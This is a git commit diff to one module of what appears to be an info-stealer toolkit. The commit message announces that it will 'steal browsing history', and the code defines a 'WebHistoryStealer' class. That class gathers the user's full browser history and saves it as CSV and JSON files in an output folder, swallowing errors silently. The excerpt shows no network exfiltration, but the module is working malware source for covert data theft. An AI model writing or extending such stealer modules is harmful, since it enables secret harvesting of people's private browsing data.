7549957b740a4930241a0f733ab0af0071a6812c
Hirusha Adikari <36286877+hirusha-adi@users.noreply.github.com>
2023-02-15 10:47:06 +0530

    steal browsing history along side the copied history.db from the other module

--- modules/browsers/history.py
+++ modules/browsers/history.py
@@ -1,31 +1,33 @@
-from browser_history import get_history
-import getpass
 import os
-from datetime import datetime
 
-def WEB_HISTORY_EXTRACTOR():
+from browser_history import get_history
 
-    printyn = forall.LOAD_JSON()["web-browser-history-extractor"]["print-y-n"]
-    output_filename_csv = f'{forall.USER_NAME()}\\browser_history_all.csv'
-    output_filename_json = f'{forall.USER_NAME()}\\browser_history_all.json'
+from config.constants import Constant
+from config.manager import ModuleManager
 
-    try:
-        os.mkdir(forall.USER_NAME())
-    except Exception as e:
-        print("Error: ", e)
 
-    outputs = get_history()
-    his = outputs.histories
-
-    for i in his:
-        print(f'\n\n{i[0]} - {i[1]}')
+class WebHistory(ModuleManager):
+    def __init__(self) -> None:
+        super().__init__(module_name="WebHistoryStealer")
+        
+        self.browsers_folder = os.path.join(self.output_folder_user, 'browsers')
+        self.output_filename_csv = os.path.join(self.browsers_folder, 'browser_history_all.csv')
+        self.output_filename_json = os.path.join(self.browsers_folder, 'browser_history_all.json')
+        
+        if not os.path.isdir(self.browsers_folder):
+            os.makedirs(self.browsers_folder)
     
-    try:
-        outputs.save(f'{output_filename_csv}')
-    except Exception as e:
-        print("Error: ", e)
-
-    try:
-        outputs.save(f'{output_filename_json}')
-    except Exception as e:
-        print("Error: ", e)
+    def run(self):
+        outputs = get_history()
+    
+        if Constant.browser_history_csv:
+            try:
+                outputs.save(f'{self.output_filename_csv}')
+            except:
+                pass
+    
+        if Constant.browser_history_json:
+            try:
+                outputs.save(f'{self.output_filename_json}')
+            except:
+                pass
